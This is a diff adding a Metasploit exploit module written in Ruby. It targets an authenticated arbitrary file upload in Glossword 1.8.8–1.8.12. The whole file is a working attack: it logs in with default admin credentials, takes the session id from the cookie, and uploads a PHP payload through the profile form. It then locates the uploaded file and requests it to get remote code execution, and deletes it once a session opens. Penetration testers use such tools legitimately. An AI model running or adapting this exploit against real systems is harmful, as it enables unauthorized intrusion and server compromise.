@@ -1,0 +1,192 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+#   http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info={})
+		super(update_info(info,
+			'Name'           => "Glossword v1.8.8 - 1.8.12 Arbitrary File Upload Vulnerability",
+			'Description'    => %q{
+				This module exploits a file upload vulnerability in Glossword
+				versions 1.8.8 to 1.8.12 when run as a standalone application.
+				This application has an upload feature that allows an authenticated user
+				with administrator roles to upload arbitrary files to the 'gw_temp/a/'
+				directory.
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         =>
+				[
+					'AkaStep', # Discovery
+					'Brendan Coles <bcoles[at]gmail.com>' # metasploit exploit
+				],
+			'References'     =>
+				[
+					[ 'EDB',  '24456' ],
+					[ 'OSVDB' '89960' ]
+				],
+			'Platform'       => 'php',
+			'Arch'           => ARCH_PHP,
+			'Targets'        => [['Automatic Targeting', { 'auto' => true }]],
+			'Privileged'     => true,
+			'DisclosureDate' => "Feb 05 2013",
+			'DefaultTarget'  => 0))
+
+		register_options(
+			[
+				OptString.new('TARGETURI', [true, 'The path to the web application', '/glossword/1.8/']),
+				OptString.new('USERNAME',  [true, 'The username for Glossword', 'admin']),
+				OptString.new('PASSWORD',  [true, 'The password for Glossword', 'admin'])
+			], self.class)
+	end
+
+	def check
+
+		base  = target_uri.path
+		peer  = "#{rhost}:#{rport}"
+		user  = datastore['USERNAME']
+		pass  = datastore['PASSWORD']
+
+		# login
+		print_status("#{peer} - Authenticating as user '#{user}'")
+		begin
+			res = login(base, user, pass)
+			if res
+				if res.code == 200
+					print_error("#{peer} - Authentication failed")
+					return Exploit::CheckCode::Unknown
+				elsif res.code == 301 and res.headers['set-cookie'] =~ /sid([\da-f]+)=([\da-f]{32})/
+					print_good("#{peer} - Authenticated successfully")
+					return Exploit::CheckCode::Appears
+				end
+			end
+			return Exploit::CheckCode::Safe
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+			print_error("#{peer} - Connection failed")
+		end
+		return Exploit::CheckCode::Unknown
+
+	end
+
+	def on_new_session(client)
+		if client.type == "meterpreter"
+			client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
+			client.fs.file.rm("#{@fname}")
+		else
+			client.shell_command_token("rm #{@fname}")
+		end
+	end
+
+	def upload(base, sid, fname, file)
+
+		user = datastore['USERNAME']
+		pass = datastore['PASSWORD']
+		data = Rex::MIME::Message.new
+		data.add_part(file,       'application/x-php', nil, "form-data; name=\"file_location\"; filename=\"#{fname}\"")
+		data.add_part("edit-own", nil, nil, 'form-data; name="a"')
+		data.add_part("users",    nil, nil, 'form-data; name="t"')
+		data.add_part("Save",     nil, nil, 'form-data; name="post"')
+		data.add_part("#{sid}",   nil, nil, 'form-data; name="sid"')
+		data.add_part("#{user}",  nil, nil, 'form-data; name="arPost[login]"')
+		data.add_part("#{pass}",  nil, nil, 'form-data; name="arPost[pass_new]"')
+		data.add_part("#{pass}",  nil, nil, 'form-data; name="arPost[pass_confirm]"')
+
+		data_post = data.to_s
+		data_post = data_post.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')
+
+		res = send_request_cgi({
+			'method'  => 'POST',
+			'uri'     => normalize_uri(base, 'gw_admin.php'),
+			'ctype'   => "multipart/form-data; boundary=#{data.bound}",
+			'data'    => data_post,
+		})
+
+		return res
+	end
+
+	def login(base, user, pass)
+
+		res   = send_request_cgi({
+			'method' => 'POST',
+			'uri'    => normalize_uri(base, 'gw_login.php'),
+			'data'   => "arPost%5Buser_name%5D=#{user}&arPost%5Buser_pass%5D=#{pass}&arPost%5Blocale_name%5D=en-utf8&a=login&sid=&post=Enter"
+		})
+		return res
+
+	end
+
+	def exploit
+
+		base  = target_uri.path
+		@peer = "#{rhost}:#{rport}"
+		@fname= rand_text_alphanumeric(rand(10)+6) + '.php'
+		user  = datastore['USERNAME']
+		pass  = datastore['PASSWORD']
+
+		# login; get session id and token
+		print_status("#{@peer} - Authenticating as user '#{user}'")
+		res = login(base, user, pass)
+		if res and res.code == 301 and res.headers['set-cookie'] =~ /sid([\da-f]+)=([\da-f]{32})/
+			token = "#{$1}"
+			sid   = "#{$2}"
+			print_good("#{@peer} - Authenticated successfully")
+		else
+			fail_with(Exploit::Failure::NoAccess, "#{@peer} - Authentication failed")
+		end
+
+		# upload PHP payload
+		print_status("#{@peer} - Uploading PHP payload (#{payload.encoded.length} bytes)")
+		php = %Q|<?php #{payload.encoded} ?>|
+		begin
+			res = upload(base, sid, @fname, php)
+			if res and res.code == 301 and res['location'] =~ /Setting saved/
+				print_good("#{@peer} - File uploaded successfully")
+			else
+				fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Uploading PHP payload failed")
+			end
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+			fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
+		end
+
+		# retrieve PHP file path
+		print_status("#{@peer} - Locating PHP payload file")
+		begin
+			res   = send_request_cgi({
+				'method' => 'GET',
+				'uri'    => normalize_uri(base, 'gw_admin.php?a=edit-own&t=users'),
+				'cookie' => "sid#{token}=#{sid}"
+			})
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+			fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
+		end
+		if res and res.code == 200 and res.body =~ /<img width="" height="" src="([^"]+)"/
+			shell_uri = "#{$1}"
+			@fname    = shell_uri.match('(\d+_[a-zA-Z\d]+\.php)')
+			print_good("#{@peer} - Found payload file path (#{shell_uri})")
+		else
+			fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Failed to find PHP payload file path")
+		end
+
+		# retrieve and execute PHP payload
+		print_status("#{@peer} - Executing payload (#{shell_uri})")
+		begin
+			send_request_cgi({
+				'method' => 'GET',
+				'uri'    => normalize_uri(base, shell_uri),
+			})
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+			fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
+		end
+		if !res or res.code != 200
+			fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Executing payload failed")
+		end
+	end
+end
